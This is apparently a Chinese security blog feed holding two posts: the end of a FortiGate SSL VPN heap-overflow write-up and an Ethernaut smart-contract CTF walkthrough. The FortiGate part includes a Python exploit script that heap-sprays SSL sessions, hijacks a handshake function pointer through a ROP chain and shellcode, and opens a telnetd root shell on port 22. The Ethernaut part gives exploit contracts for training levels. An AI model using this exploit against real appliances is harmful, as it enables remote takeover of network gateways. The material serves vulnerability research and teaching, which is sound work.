+<p><strong>这样短暂的转换就带来了很大的问题</strong>，笔者构造的CL <code>2**31+1</code>在转换前后：</p>
+<pre><code>$rsi   : 0x80000002
+$rsi   : 0xffffffff80000002
+</code></pre>
+<p>如此进入到<code>pool_alloc</code>中的<code>memset</code>时，这个长度导致了越界访问的段错误。</p>
+<p>想要转换成堆溢出，我们只需要构造一个大于32bit范围的数据，比如<code>0x100000000</code>，低32bits全部为0，在被转化为32bit的数据时，高位的精度会全部丢失，这时递增1后重新转化为64bit，结果就只有1了。</p>
+<p>如此一来在申请时只申请了最小粒度的空间，而后续memcpy时就能填入至多<code>0x100000000</code>的数据，从而造成堆溢出。</p>
+<h2 id="堆喷">堆喷</h2>
+<p>得到堆溢出之后，我们需要调整一下堆上的布局从而方便后续利用。</p>
+<p>参考<a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/">这篇博客</a>在完成<code>CVE-2018-13379 + CVE-2018-13383</code>时的思路，喷射SSL结构体。</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/02/05/65c09518e2e5a.webp" alt="1707119895204.webp" loading="lazy"></figure>
+<p>通过不断发送https请求来喷射大量的ssl结构体，随后以固定间隔释放一部分连接来制造Hole。我们此时触发堆溢出就能破坏掉某个连接的ssl结构体。</p>
+<p>查看openssl的源码，找到<code>struct ssl_st</code></p>
+<pre><code class="language-c">struct ssl_st {
+    /*
+     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,
+     * DTLS1_VERSION)
+     */
+    int version;
+    /* SSLv3 */
+    const SSL_METHOD *method;
+    /*
+     * There are 2 BIO's even though they are normally both the same.  This
+     * is so data can be read and written to different handlers
+     */
+    /* used by SSL_read */
+    BIO *rbio;
+    /* used by SSL_write */
+    BIO *wbio;
+    /* used during session-id reuse to concatenate messages */
+    BIO *bbio;
+    /*
+     * This holds a variable that indicates what we were doing when a 0 or -1
+     * is returned.  This is needed for non-blocking IO so we know what
+     * request needs re-doing when in SSL_accept or SSL_connect
+     */
+    int rwstate;
+    int (*handshake_func) (SSL *);
+    /*
+     * Imagine that here's a boolean member &quot;init&quot; that is switched as soon
+     * as SSL_set_{accept/connect}_state is called for the first time, so
+     * that &quot;state&quot; and &quot;handshake_func&quot; are properly initialized.  But as
+     * handshake_func is == 0 until then, we use this test instead of an
+     * &quot;init&quot; member.
+     */
+    /* are we the server side? */
+    int server;
+    
+    ......
+
+};
+
+</code></pre>
+<p>我们设法可以劫持该结构体上的<code>handshake_func</code>指针。</p>
+<p>此时还需要想办法定位ssl_st结构体：</p>
+<pre><code class="language-c">__int64 __fastcall sub_1785C90(__int64 a1, __int64 a2)
+{
+  int v2; // r14d
+  __int64 v4; // rbx
+  __int64 v5; // rax
+  _DWORD *v6; // rax
+  __int64 v7; // rsi
+
+  v2 = 30;
+  v4 = sub_178BA40(*(unsigned int *)(a1 + 144));
+  sub_1790110(a2, &quot;send_expect_100&quot;, 0LL, 4LL, send_expect_100);
+  sub_1790110(a2, &quot;read_post_data&quot;, 0LL, 1LL, read_post_data);
+  sub_1790260(a2, sub_17859B0);
+  sub_1790280(a2, sub_1785BB0);
+  if ( v4 )
+    v2 = *(_DWORD *)(v4 + 68);
+  v5 = sub_178FD50(a1);
+  if ( !v5 || (v6 = *(_DWORD **)(v5 + 56)) == 0LL || (v7 = 1000LL, (unsigned int)(*v6 - 6) &lt;= 2) )
+    v7 = (unsigned int)(100 * v2);
+  sub_1790270(a2, v7, 0LL);
+  return 0LL;
+}
+</code></pre>
+<p>该函数调用了<code>sub_1790110</code>来分配ssl_st结构体，并且复制了一个字符串在结构体偏移200处</p>
+<pre><code class="language-c">char *__fastcall sub_1790110(__int64 *a1, const char *a2, int a3, int a4, __int64 a5)
+{
+  size_t v7; // rax
+  char *v8; // rax
+  char *v9; // r12
+  char *v10; // rax
+  char **v11; // rax
+
+  v7 = strlen(a2);
+  v8 = (char *)pool_alloc(*a1, v7 + 201);
+  v9 = v8;
+  if ( v8 )
+  {
+    *(_QWORD *)v8 = v8;
+    *((_QWORD *)v8 + 1) = v8;
+    v10 = &amp;v8[32 * a3];
+    *((_DWORD *)v10 + 6) = a4;
+    *((_DWORD *)v10 + 7) = a4;
+    if ( (a4 &amp; 1) != 0 )
+    {
+      *(_QWORD *)&amp;v9[32 * a3 + 32] = a5;
+    }
+    else if ( (a4 &amp; 4) != 0 )
+    {
+      *(_QWORD *)&amp;v9[32 * a3 + 40] = a5;
+    }
+    strcpy(v9 + 200, a2);  // here
+    v11 = (char **)a1[13];
+    a1[13] = (__int64)v9;
+    *(_QWORD *)v9 = a1 + 12;
+    *((_QWORD *)v9 + 1) = v11;
+    *v11 = v9;
+  }
+  return v9;
+}
+</code></pre>
+<p>所以我们只需要定位<code>read_post_data</code>字符串就行能推算出<code>handshake_func</code>指针的位置。</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/02/05/65c0982a46222.webp" alt="1707120680032.webp" loading="lazy"></figure>
+<p>由于该结构体也是通过<code>je_malloc</code>分配的，和为post数据分配的空间处于同一个区域内，所以可以大量创建ssl会话，然后释放其中一部分制造出空洞，随后创建出恶意会话，该会话的结构体就会被申请到某个空洞上来配合溢出。</p>
+<h2 id="完成利用">完成利用</h2>
+<p>并非最终利用，仅供参考</p>
+<pre><code class="language-python">from pwn import *
+import socket
+import ssl
+
+context.arch='amd64'
+
+def create_ssl_ctx(host = b'192.168.128.135', name = 4443):
+	try:
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		try:
+			sock.connect((host, name))
+		except (socket.error, OSError) as e :
+			print(e)
+			return None
+		context = ssl._create_unverified_context()
+		sock = context.wrap_socket(sock)
+		print('[+] connected')
+		return sock
+	except Exception as e:
+		print(e)
+		return None
+
+
+def make_request_hdr(cl, content, host = b'192.168.128.135', path = b'/remote/login'):
+	length = bytes(str(cl), encoding='utf-8')
+
+	data = b'POST ' + path + b' HTTP/1.1\r\n'
+	data += b'Host: ' + host + b'\r\n'
+	data += b'Content-Length: ' + length + b'\r\n'
+	data += b'User-Agent: Mozilla/5.0\r\n'
+	data += b'Content-Type: text/plain;charset=UTF-8\r\n'
+	data += b'Accept: */*\r\n\r\n'
+	data += content
+
+	return data
+
+
+socks = []
+
+for i in range(60):
+	_sock = create_ssl_ctx()
+	_sock.sendall(make_request_hdr(100, b'a=1'))
+	socks.append(_sock)
+
+for i in range(20, 40, 2):
+	_sock = socks[i]
+	_sock.close()
+	socks[i] = None
+
+devil_sock = create_ssl_ctx()
+
+for i in range(20):
+	socks.append(create_ssl_ctx())
+
+stack_pivot = 0x000000000140583a # push rdx ; pop rsp ; add edi, edi ; nop ; ret
+pop_rsi = 0x0000000000530c9e # pop rsi ; ret
+pop_rdx = 0x0000000000509382 # pop rdx ; ret
+pop_rax = 0x000000000046bb37 # pop rax ; ret
+pop_rdx_rdi = 0x0000000002381372 # pop rdx ; pop rdi ; ret
+pop_rcx_rsi = 0x000000000256f583 # pop rcx ; pop rsi ; ret
+and_rax_rcx = 0x0000000002b83960 # and rax, rcx ; ret
+add_rsp = 0x0000000002b7fdf1 # add rsp, 0x20 ; pop rbx ; ret
+mov_rdi_rdx = 0x000000000045d852 # mov rdi, rdx ; test esi, esi ; jne 0x45d860 ; ret
+mov_rcx_rdi = 0x00000000005f4af7 # mov rcx, rdi ; jne 0x5f4b00 ; ret
+mov_rcx_rax = 0x0000000002a1b770 # mov rcx, rax ; test dl, dl ; jne 0x2a1b750 ; ret
+mov_rdx_rcx = 0x000000000279ab44 # mov rdx, rcx ; jmp rax
+mov_rdi_rax = 0x0000000002b49d10 # mov rdi, rax ; call rcx
+call_rsp = 0x000000000046c8c7 # call rsp
+writeable_addr = 0x0000000003fc5000
+mprotect_plt = 0x43f3e0
+
+'''
+0x00000000027ce88c : sub rsp, rax ; mov rdi, rsp ; call qword ptr [rbx]
+0x00000000027d3d51 : mov rdi, rsp ; mov r12, rsp ; call qword ptr [rbx]
+'''
+
+def place_str_in_stack(arg):
+	ret = ''
+	# padding
+	if len(arg)%8 != 0:
+		arg += '\x00' * (8 - (len(arg) % 8))
+	else:
+		arg += '\x00' * 8
+	for i in range(0, len(arg), 8):
+		# print(arg[i:i+8])
+		ret = 'mov rax, {};push rax;'.format(u64(arg[i:i+8])) + ret
+	
+	return ret
+
+sc = asm('''
+	mov rsp, rbp;
+	{}
+	mov rdi, rsp;
+	xor rsi, rsi;
+	xor rdx, rdx;
+	mov rax, 0x43ec20;
+	call rax;
+'''.format(place_str_in_stack('/bin/busybox killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22')))
+
+offset = 0xe20-0xc0
+pay = cyclic(offset)
+
+for i in range(3):
+	pay += p64(add_rsp)
+	pay += p64(writeable_addr)*5
+pay += p64(pop_rsi) + p64(writeable_addr)
+pay += p64(add_rsp) + p64(writeable_addr)*3
+
+pay = pay.ljust(offset + 192, b'e')
+pay += p64(stack_pivot)
+pay += p64(writeable_addr)
+
+# mprotect($rdx, 0x4000, 7)
+pay += p64(pop_rsi) + p64(0)
+pay += p64(mov_rdi_rdx)
+pay += p64(mov_rcx_rdi)
+pay += p64(pop_rax) + p64(0xfffffffffffff000)
+pay += p64(and_rax_rcx)
+pay += p64(pop_rdx) + p64(0)
+pay += p64(mov_rcx_rax)
+pay += p64(pop_rax) + p64(pop_rsi+1)
+pay += p64(mov_rdx_rcx)
+pay += p64(mov_rdi_rdx)
+pay += p64(pop_rdx) + p64(7)
+pay += p64(pop_rsi) + p64(0x4000)
+pay += p64(mprotect_plt)
+pay += p64(call_rsp)
+pay += sc
+
+devil_sock.sendall(make_request_hdr(0x1000000000, pay))
+
+# trigger
+for sk in socks:
+	if sk is not None:
+		sk.sendall(b'a'*60)
+
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.pirates.re/fortigate-vm-for-vulnerability-discovery">https://www.pirates.re/fortigate-vm-for-vulnerability-discovery</a></p>
+<p><a href="https://forum.butian.net/index.php/share/2166">https://forum.butian.net/index.php/share/2166</a></p>
+<p><a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ethernaut刷题记录]]></title>
+        <id>https://kotoriseed.github.io/post/ethernaut/</id>
+        <link href="https://kotoriseed.github.io/post/ethernaut/">
+        </link>
+        <updated>2024-01-14T10:49:29.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>笔者想学习web3已经很久了，奈何一直没有静下心来学习。最近有了一定时间窗口可以学习，所以找到了这个靶场入门（怎么有人4202年了才开始学blockchain啊），在做题之前需要先掌握blockchain的一部分基础知识以及solidity语言和evm，这部分最好先自行了解一下。笔者也是初学者，有说的不对的地方恳请斧正</p>
+</blockquote>
+<h1 id="hello-ethernaut">Hello Ethernaut</h1>
+<p>简单的介绍了通过web终端的js web3接口与合约交互的方法，熟悉一遍即可。</p>
+<h1 id="fallback">Fallback</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+
+  mapping(address =&gt; uint) public contributions;
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+    contributions[msg.sender] = 1000 * (1 ether);
+  }
+
+  modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            &quot;caller is not the owner&quot;
+        );
+        _;
+    }
+
+  function contribute() public payable {
+    require(msg.value &lt; 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] &gt; contributions[owner]) {
+      owner = msg.sender;
+    }
+  }
+
+  function getContribution() public view returns (uint) {
+    return contributions[msg.sender];
+  }
+
+  function withdraw() public onlyOwner {
+    payable(owner).transfer(address(this).balance);
+  }
+
+  receive() external payable {
+    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);
+    owner = msg.sender;
+  }
+}
+</code></pre>
+<p>关卡目标是成为合约的owner，以及清空合约的balance。</p>
+<p>可以看到构造函数中赋予了初始的owner（也就是合约的部署者），并将他的contribution设置为了1000eth</p>
+<p><code>contribute</code>函数允许交互者通过捐钱的方式增加contribution值，如果contribution超过了owner的1000eth就可以成为新的owner，不过函数开头有一个蛋疼的判断 <code>require(msg.value &lt; 0.001 ether)</code>，正儿八经的捐钱的话，不管是gas fee还是钱包余额还是花费的时间都不太看得下去，因此这个方法并不可行。</p>
+<p><code>getContribution</code>是返回交互者contribution的getter方法，与解题关系不大。</p>
+<p><code>withdraw</code>将合约的所有<code>balance</code>都转给了owner，也就是将其清空，不过只有owner能调用。</p>
+<p>最后的<code>receive</code>比较有意思，在solidity语言中，每个合约可以有至多一个<code>receive</code>函数和一个<code>fallback</code>函数。他们都用来处理交互时其他函数未命中的情况，不过receive不会处理msg.data，且触发优先级在fallback之后（如果fallback具有payable属性的话）。更多细节可以参考<a href="https://docs.soliditylang.org/en/v0.8.23/contracts.html#receive-ether-function">官方文档</a>。</p>
+<p>在该合约的<code>receive</code>中，有一个简单的check：</p>
+<p><code>require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0)</code></p>
+<p>只要msg.value和自己的contribution大于0，即可成为合约新的owner，而这些条件都很好满足。</p>
+<ol>
+<li>首先调用contribute，提升自己的contribution：<code>contract.contribute({value:1})</code></li>
+<li>直接发起交易，触发receive：<code>contract.sendTransaction({value:1})</code></li>
+<li>此时已经是owner了，调用后门清空balance：<code>contract.withdraw()</code></li>
+</ol>
+<h1 id="fal1out">Fal1out</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import 'openzeppelin-contracts-06/math/SafeMath.sol';
+
+contract Fallout {
+  
+  using SafeMath for uint256;
+  mapping (address =&gt; uint) allocations;
+  address payable public owner;
+
+
+  // constructor
+  function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+
+  modifier onlyOwner {
+	        require(
+	            msg.sender == owner,
+	            &quot;caller is not the owner&quot;
+	        );
+	        _;
+	    }
+
+  function allocate() public payable {
+    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+  }
+
+  function sendAllocation(address payable allocator) public {
+    require(allocations[allocator] &gt; 0);
+    allocator.transfer(allocations[allocator]);
+  }
+
+  function collectAllocations() public onlyOwner {
+    msg.sender.transfer(address(this).balance);
+  }
+
+  function allocatorBalance(address allocator) public view returns (uint) {
+    return allocations[allocator];
+  }
+}
+</code></pre>
+<p>通关条件是成为owner，仔细分析合约，发现调用<code>fal1out</code>即可成为owner，虽然在该函数上方有一行注释表名它是构造函数，但看完了solidity的文档都没有找到类似的语法<del>，所以虽然不解，但他肯定是在骗人</del></p>
+<p>所以直接调用fal1out即可。</p>
+<pre><code class="language-javascript">contract.Fal1out({value: 1})
+</code></pre>
+<h1 id="coin-flip">Coin Flip</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+</code></pre>
+<p>这关的通关条件是<code>consecutiveWins</code>达到10，也就是每次调用<code>flip</code>来猜测一个bool值（猜硬币的正反面）。</p>
+<p>不过需要连续猜对10次才行，中间断掉都会被清空，因此不可能暴力去猜测（矿工：多来点多来点）</p>
+<p>想要准确的预测结果，就需要我们再次分析一下这个flip函数的实现。</p>
+<p>参考solidity文档中的描述，</p>
+<pre><code class="language-javascript">blockhash(uint blockNumber) returns (bytes32): hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
+
+block.number (uint): current block number
+</code></pre>
+<p><code>blockhash</code>可以返回最近256个block的hash值，其他情况就会返回0</p>
+<p>这里<code>blockValue</code>是调用的blockhash获取<strong>上一个</strong>block的hash值，然后查看他是否大于等于<code>0x8000000000000000000000000000000000000000000000000000000000000000</code>来决定抛硬币的结果。</p>
+<p>这里很容易就能想到解决办法，因为每一次都获取的是上一个block的hash，所以其实每次都已经可以算出来了。</p>
+<p>本来想直接在chrome的console里调js的web3接口直接解决，但是没找到调用blockhash()这种函数的abi，所以只能在remix ide里面部署中间合约来交互了。</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+
+contract exp {
+    CoinFlip public interactContract;
+
+    constructor(address _addr) {
+        interactContract = CoinFlip(_addr);
+    }
+
+    function guess() public {
+        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        interactContract.flip(side);
+    }
+}
+</code></pre>
+<p>（第一次用remix ide部署合约，半天没发现要连上自己钱包，一直在用fork出来的网交互，我说怎么一直查不到区块number，另：交互10次真的好难等）</p>
+<h1 id="telephone">Telephone</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+</code></pre>
+<p>目标仍然是成为合约的owner，并且很直白的给出了<code>changeOwner</code>函数</p>
+<p>参考官方文档对<code>tx.origin</code>的描述：</p>
+<pre><code class="language-javascript">tx.origin (address): sender of the transaction (full call chain)
+msg.sender (address): sender of the message (current call)
+</code></pre>
+<p><code>tx.origin</code>是交易最初的发起方，而<code>msg.sender</code>是当前的合约交互方（可以理解为一个是整个交易链的头结点，一个是当前节点）。</p>
+<p>这里我们采用布置一个中间协议来交互的方式绕过这个判断。</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract exp {
+  Telephone public interactContract;
+  constructor(address _addr) {
+	interactContract = Telephone(_addr);
+  }
+  
+  function forwardToTelephone() public {
+    interactContract.changeOwner(msg.sender);
+  }
+}
+</code></pre>
+<p>该题揭示了一种真实存在的漏洞类型：<code>fishing-style attack</code>，<a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks">参考链接</a></p>
+<h1 id="token">Token</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address =&gt; uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value &gt;= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+</code></pre>
+<p>题目初始给了我们20个Token，我们的目标是增加手中的Token。</p>
+<p>根据某些直觉，我们发现<code>transfer</code>中判断余额是否足够的方法存在一些问题，<code>_value</code>与<code>balances</code>的<code>value</code>都是<code>uint</code>类型的，uint之间做运算结果仍是uint，也就是说恒大于0，因此这个判断其实没有任何作用（草）。</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address =&gt; uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value &gt;= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+
+contract exp {
+  Token public interactContract;
+  constructor(address _addr) public {
+    interactContract = Token(_addr);
+  }
+
+  function overflow() public {
+    interactContract.transfer(0x7Af5626f15AAa698FF6bb04f48a28fd954961d2E, 0xffffffff);
+  }
+
+}
+</code></pre>
+<h1 id="delegation">Delegation</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+</code></pre>
+<p>这道题的目标是成为Delegation的owner。提示是<code>delegatecall</code>与<code>function id</code>。对于前者，我们可以直接在<a href="https://docs.soliditylang.org/en/v0.8.23/contracts.html#libraries">文档</a>中找到明确的定义，简单的说就是允许直接<strong>以当前合约的上下文</strong>来运行其他合约或库中的某个函数，可以粗略地理解为将对应函数直接inline到当前位置；而后者询问ChatGPT后得知：</p>
+<pre><code>在 Solidity 中，每个函数都有一个唯一的函数选择器（function selector），也称为函数的 ID。函数选择器是通过函数的签名计算得到的，它用于标识和区分不同的函数。
+
+函数选择器的计算方式是将函数的名称和参数类型进行编码，并对编码后的结果进行哈希。Solidity 中使用 Keccak-256（SHA-3）哈希算法来计算函数选择器。
+</code></pre>
+<p>一般来说，取sha3结果的前4bytes就行了。</p>
+<p>梳理一下源码，<code>Delegation</code>合约中除了构造函数以外的地方都没法直接改变owner了。但是在fallback中，有一个直白的<code>address(delegate).delegatecall(msg.data)</code>，也就是说，我们可以通过控制<code>msg.data</code>来以当前合约的上下文调用任意<code>Delegate</code>合约中的public函数。</p>
+<p>而<code>Delegate</code>合约刚好就有一个<code>pwn</code>函数可以劫持owner。</p>
+<p>直接在web console交互：</p>
+<p><code>contract.sendTransaction({data: web3.utils.sha3(&quot;pwn()&quot;).slice(0, 10)})</code></p>
+<p>（一个小插曲：其实笔者最开始是在remix ide中使用<code>Low level interactions</code>直接发送data过去的，这样做并没有问题，可笔者当时没能成功劫持owner。在万分不解中，去<code>etherscan</code>查看了交易详情，发现问题出在交易设置的<code>gas limit</code>上，每次都是因为消耗的gas达到了上限，evm并没有跑完代码。而web console中的web3 api对gas的估算就太大了，gas limit始终在2M左右，所以没有遇到out of gas错误）</p>
+<h1 id="force">Force</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+</code></pre>
+<p>关卡目标是让合约的余额大于0，</p>
+<p>提示如下：</p>
+<pre><code>Fallback methods
+Sometimes the best way to attack a contract is with another contract.
+</code></pre>
+<p>一个合约如果没有receive函数，也没有具有payable属性的fallback函数，那他就没办法接受以太币转账——通常情况下是这样的。然而有一个例外是，当某个合约调用<code>selfdesturct</code>自毁时，可以无视条件向一个账户转去自己剩余的以太币，而这就是解出该题的关键。</p>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}
+
+contract exp {
+  Force public victim;
+
+  constructor(address _addr) {
+    victim = Force(_addr);
+  }
+
+  function whiteGive() public {
+    selfdestruct(payable(address(victim)));
+  }
+
+  receive() external payable { }
+
+}
+</code></pre>
+<p>（部署好exp合约后记得转一点钱进去再自毁，不然<code>whiteGive</code>就真white give了。）</p>
+<p>解出该题过后，会出现一个提示：任何情况下都不要使用<code>address(this).balance == 0</code>这样的判断。</p>
+<h1 id="vault">Vault</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Vault {
+  bool public locked;
+  bytes32 private password;
+
+  constructor(bytes32 _password) {
+    locked = true;
+    password = _password;
+  }
+
+  function unlock(bytes32 _password) public {
+    if (password == _password) {
+      locked = false;
+    }
+  }
+}
+</code></pre>
+<p>关卡目标是让locked变为false。</p>
+<p>直观的看，想要成功unlock，就需要知道合约执行构造函数时传入的<code>_password</code>，这看上去似乎很难实现。</p>
+<p>虽然<code>password</code>是<code>private</code>的，编译器不会像public的变量那样为他生成默认的getter函数供外部访问，但其实我们还是可以借助web3提供的接口来人工查到，只需要知道他所处的地址就行。</p>
+<p>那么<code>password</code>在合约内部的位置是怎样的呢，这就需要对编译器生成的evm字节码进行分析了。</p>
+<p>用etherscan提供的decompiler进行反编译，这个<code>stor1</code>其实就是<code>password</code>变量，他被存在<code>stirage 1</code>的位置</p>
+<pre><code>def storage:
+  locked is uint8 at storage 0
+  stor1 is uint256 at storage 1
+</code></pre>
+<p>也可以直接在remix ide的compiler中查看details中的STORAGELAYOUT:</p>
+<pre><code class="language-json">{
+    &quot;storage&quot;: [
+        {
+            &quot;astId&quot;: 3,
+            &quot;contract&quot;: &quot;koin.sol:Vault&quot;,
+            &quot;label&quot;: &quot;locked&quot;,
+            &quot;offset&quot;: 0,
+            &quot;slot&quot;: &quot;0&quot;,
+            &quot;type&quot;: &quot;t_bool&quot;
+        },
+        {
+            &quot;astId&quot;: 5,
+            &quot;contract&quot;: &quot;koin.sol:Vault&quot;,
+            &quot;label&quot;: &quot;password&quot;,
+            &quot;offset&quot;: 0,
+            &quot;slot&quot;: &quot;1&quot;,
+            &quot;type&quot;: &quot;t_bytes32&quot;
+        }
+    ],
+    &quot;types&quot;: {
+        &quot;t_bool&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;bool&quot;,
+            &quot;numberOfBytes&quot;: &quot;1&quot;
+        },
+        &quot;t_bytes32&quot;: {
+            &quot;encoding&quot;: &quot;inplace&quot;,
+            &quot;label&quot;: &quot;bytes32&quot;,
+            &quot;numberOfBytes&quot;: &quot;32&quot;
+        }
+    }
+}
+</code></pre>
+<p><code>&quot;slot&quot;: &quot;1&quot;</code>代表被放在了第一个槽内。</p>
+<p>这部分的原理可以参考<a href="https://docs.soliditylang.org/en/v0.8.23/internals/layout_in_storage.html">官方文档</a>的描述，笔者就不赘述了。</p>
+<p>直接在web console调用：</p>
+<p><code>web3.eth.getStorageAt(&quot;0x4e162147f83a2f4E818608099fB40235a1da8135&quot;, 1)</code></p>
+<p>得到了一个hex串：<code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</code></p>
+<p>（from hex的结果是<code>A very strong secret password :)</code>）</p>
+<p>知道密码后这题就结束了，这道题带给我们的启示就是，如果真的想存放某些不想公开的数据，光是设置private属性是没用的，一个建议的做法是先加密后再存入链中，至于加密使用的密钥，永远也别让他上链。</p>
+<h1 id="king">King</h1>
+<pre><code class="language-javascript">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+
+  address king;
+  uint public prize;
+  address public owner;
+
+  constructor() payable {
+    owner = msg.sender;  
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value &gt;= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address) {
+    return king;
+  }
+}
+</code></pre>
+<p>这道题展示了一个类似于庞氏骗局的游戏：合约中定义了<code>king</code>，以及他当上<code>king</code>时所出的<code>prize</code>。当一个人支付了更高的<code>prize</code>时，他将成为新的<code>king</code>，而前一个<code>king</code>也将收到这笔钱从而获得利润。</p>
+<p>不过不难看出，<code>receive</code>函数中对<code>king</code>的更新条件还留了一个后门，即当<code>msg.sender == owner</code>时，<code>king</code>会无视金额转让。这意味着想要保持王位，在提交题目时，我们必须是该合约的owner——或者阻止<code>king = msg.sender</code>的执行（笑）。</p>
+<p>该合约不具备让我们成为owner的条件，但也不是毫无突破口。在进行king的转让流程时，他是先调用<code>payable(king).transfer(msg.value)</code>向之前的国王进行转账，然后再<code>king = msg.sender</code>转让王位。这样就出现了一个窗口期：我们部署一个中间合约并让其成为<code>king</code>，在提交题目时，对方重新声明王位时就会向我们的中间合约转账，必然会触发我们的<code>receive</code>函数，而这中间我们就可以做一些事情。</p>
